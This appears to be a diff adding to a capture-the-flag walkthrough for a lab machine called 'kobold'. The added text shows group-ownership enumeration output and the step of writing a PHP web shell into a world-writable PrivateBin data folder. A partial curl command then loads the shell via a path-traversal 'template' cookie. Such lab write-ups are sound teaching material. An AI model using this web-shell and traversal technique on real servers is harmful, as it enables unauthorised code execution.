@@ -216,7 +216,26 @@ ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ cat /home/ben/user.txt
 
 ### Enumeration
 
-enumerate group operator, write a php shell inside /privatebin-data/data/bd/b5/ (world writable)
+enumerate group operator:
+
+```
+ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ find / -group operator  
+<e_modules/@mcpjam/inspector$ find / -group operator      
+/privatebin-data
+/privatebin-data/certs
+/privatebin-data/certs/key.pem
+/privatebin-data/certs/cert.pem
+find: '/privatebin-data/cfg': Permission denied
+/privatebin-data/data
+/privatebin-data/data/purge_limiter.php
+/privatebin-data/data/bd
+/privatebin-data/data/bd/b5
+/privatebin-data/data/.htaccess
+/privatebin-data/data/e3
+
+```
+
+write a php shell inside /privatebin-data/data/bd/b5/ (world writable)
 
  `curl -k https://bin.kobold.htb/ \`                    
   `-b "template=../data/bd/b5/shell" \`
